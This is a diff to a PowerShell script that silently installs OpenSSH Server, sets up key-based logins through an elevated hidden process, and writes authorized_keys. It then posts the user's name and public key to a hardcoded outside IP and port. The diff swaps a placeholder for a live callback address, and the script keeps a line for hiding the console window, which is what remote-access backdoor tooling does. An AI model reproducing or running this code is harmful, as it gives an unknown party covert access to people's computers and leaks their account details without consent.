@@ -7,7 +7,7 @@ Add-Type @"
         public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     }
 "@
-# [WinAPI]::ShowWindow($hwnd, 0) # hide terminal commented to tests
+# [WinAPI]::ShowWindow($hwnd, 0)
 $opensshServer = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'
 if ($opensshServer.State -ne 'Installed') {
     Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -25,7 +25,8 @@ HostKey __PROGRAMDATA__/ssh/ssh_host_ed25519_key
 HostKey __PROGRAMDATA__/ssh/ssh_host_rsa_key
 AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
 Subsystem sftp sftp-server.exe
-PasswordAuthentication yes
+PubkeyAuthentication yes
+PasswordAuthentication no
 "@ | Set-Content $sshdConfigPath
 }
 Restart-Service sshd
@@ -37,20 +38,22 @@ $sshDir = "$HOME\.ssh"
 if (-not (Test-Path -Path $sshDir)) {
     New-Item -ItemType Directory -Force -Path $sshDir
 }
-$sshKey = "$sshDir\id_rsa"
-$sshKeyPub = "$sshKey.pub"
-if (-not (Test-Path -Path $sshKey)) {
-    Start-Process "ssh-keygen" -ArgumentList "-t rsa -b 2048 -f $sshKey -q -N ''" -WindowStyle Hidden -Wait
-}
-if (Test-Path -Path $sshKeyPub) {
-    $publicKey = Get-Content -Path $sshKeyPub -Raw
-} else {
-    $publicKey = "[Error: Public key not generated]"
+Start-Process powershell -Verb runAs -ArgumentList {
+    $sshKey = "$HOME\.ssh\id_rsa"
+    $sshKeyPub = "$HOME\.ssh\id_rsa.pub"
+    if (-not (Test-Path -Path $sshKey)) {
+        ssh-keygen -t rsa -b 2048 -f $sshKey -q -N ''
+    }
+    if (Test-Path -Path $sshKeyPub) {
+        $publicKey = Get-Content -Path $sshKeyPub -Raw
+        Set-Content "$HOME\.ssh\authorized_keys" $publicKey
+    } else {
+        $publicKey = "[Error: Public key not generated]"
+    }
 }
 $username = $env:USERNAME
 $port = 22
-# paypy post
-$postUri = "http://IP:PORT/host"
+$postUri = "http://172.25.242.44:777/host"
 $postData = @{
     "Username" = $username
     "PublicKey" = $publicKey
